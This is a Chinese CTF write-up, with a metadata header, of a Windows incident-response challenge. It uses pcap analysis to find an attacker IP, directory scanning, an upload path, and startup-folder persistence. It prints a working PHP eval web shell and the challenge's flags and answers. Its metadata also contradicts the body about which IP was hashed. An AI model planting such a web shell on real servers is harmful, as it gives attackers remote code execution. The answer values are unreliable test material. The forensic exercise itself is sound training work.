---
title: 【CTF】暗魂CTF平台 Windows 应急响应 writeup
contest: 暗魂CTF
year: 2024
difficulty: easy
vuln_type: misc_unknown
tags:
- incident-response
- wireshark-HTTP
- pcap-analysis
- dirscan
- robots.txt
- php-study
- web-shell
- MD5-hash
- startup-persistence
attack_chain: 任务1 wireshark 桌面文件筛 HTTP 192.168.192.1 ↔ 192.168.192.132 攻击者 IP → MD5/任务2 目录扫描 / 任务3 robots.txt 内 flag{hbrj6666666666666666}/任务4 上传路径 /plugins/upload/uploadimg.php?fp=upimg 一句话木马/任务5 木马内容 <?php @eval($_POST['hbrj']);?> 启动项 C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup + C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
key_payload: 攻击者 IP MD5 = 6729fb3ef240c05a7037797ba7a97fcf  一句话木马 = <?php @eval($_POST['hbrj']);?>
one_liner: 暗魂 CTF Windows 应急响应 5 题 WP，覆盖 wireshark HTTP 分析 + 目录扫描 + 上传木马 + 启动项持久化。
lesson: 应急响应三件套：日志分析（wireshark）+ 文件痕迹（robots.txt / phpstudy）+ 进程/启动项检查；C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup 和 C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp 是 Windows 启动项两个常见位置。
quality: medium
full_path: 【CTF】暗魂CTF平台-windows应急响应-writeup.full.md
meta_path: 【CTF】暗魂CTF平台-windows应急响应-writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【CTF】暗魂CTF平台 Windows 应急响应 writeup。暗魂 CTF Windows 应急响应 5 题 WP，覆盖 wireshark HTTP 分析 + 目录扫描 + 上传木马 + 启动项持久化。。经验：应急响应三件套：日志分析（wireshark）+ 文件痕迹（robots.txt / phpstudy）+ 进程/启动项...
category: misc
subcategory: misc_other
tools_used:
- C
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/206107.html
reasoning_chain:
- 任务1 → wireshark 桌面文件筛 HTTP 192.168.192.1 ↔ 192.168.192.132 → 触发点：攻击者 IP 流量
- 假设：MD5(IP) 提交 → 动作：md5sum('192.168.192.132') → 观察：6729fb3ef240c05a7037797ba7a97fcf
- 任务2 → 目录扫描 / 任务3 robots.txt → flag{hbrj6666666666666666}
- 任务4 → 上传路径 /plugins/upload/uploadimg.php?fp=upimg 一句话木马 → 触发点：phpStudy 路径
- 任务5 → 木马内容 <?php @eval($_POST['hbrj']);?> + 启动项 → 触发点：C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup + C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
- 动作：检查两个启动项 → 观察：拿到完整 flag 链
failed_attempts:
- 试图只看进程不看启动项 → 失败：持久化是启动项
- 试图猜 webshell 路径 → 失败：必须看 robots.txt 提示
key_observations:
- 应急响应三件套：日志分析（wireshark）+ 文件痕迹（robots.txt / phpstudy）+ 进程/启动项检查
- C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 和 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 是 Windows 启动项两个常见位置
- MD5(IP) 提交是应急响应题目经典要求
prerequisites:
- Wireshark HTTP 协议分析
- 目录扫描工具（dirsearch / dirb）
- Windows 启动项路径
- phpStudy 一句话木马识别
---
# 【CTF】暗魂CTF平台-windows应急响应-writeup

> 原文: https://www.ctfiot.com/206107.html
> ID: 206107

点击蓝字

关注我们

微信搜一搜

暗魂攻防实验室

题目描述

A集团的应用服务器被黑客入侵，该服务器的Web应用系统被上传恶意软件，系统文件被恶意软件破坏，您的团队需要帮助该公司追踪此网络攻击的来源，在服务器上进行全面的检查，包括日志信息、进程信息、系统文件、恶意文件等，从而分析黑客的攻击行为，发现系统中的漏洞，并对发现的漏洞进行修复。

0x01 任务1

提交攻击者IP地址的MD5值，提交的值无需使用flag{}

首先登录目标主机后，桌面上有wireshark文件，因为是web攻击，打开后筛选http的流量，查看所有HTTP的流量发现大多数都是192.168.192.1和192.168.192.132的通信流量，且右键追踪之后可知192.168.192.132为目标服务器的站点，所以攻击者地址为192.168.192.1

转换MD5值是 6729fb3ef240c05a7037797ba7a97fcf

0x02 任务2

攻击者最先使用了什么攻击（例：SQL注入）

通过对数据包的分析，可知一直在GET一些看起来诡异的路径

看起来就是在对目录进行扫描，所以最先使用了目录扫描攻击

0x03 任务3

网站根目录robots.txt内的内容是什么

这题很简单，去看看里面有没有搭建的网站，看到有phpstudy啥的就直接点进去看，或者直接C盘根目录搜索robots.txt

答案为：flag{hbrj6666666666666666}

0x04 任务4

攻击者通过那个路径进行的上传文件

通过筛选HTTP流，目录扫描完成后就开始上传文件，可以看到上传的路径为：/plugins/upload/uploadimg.php?fp=upimg且上传了一句话木马

0x05 任务5

提交攻击者上传的后门文件内容的MD5值

上个任务就看到了上传的一句话木马

<?php @eval($_POST['hbrj']);?>

cmd输入shell:
startup
C:
UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup

C:
ProgramDataMicrosoftWindowsStart MenuProgramsStartUp

联系微信客服

扫码联系

暗魂攻防实验室

微信搜一搜

暗魂攻防实验室


```
<?php @eval($_POST['hbrj']);?>
cmd输入shell:
startup
C:
UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup
C:
ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]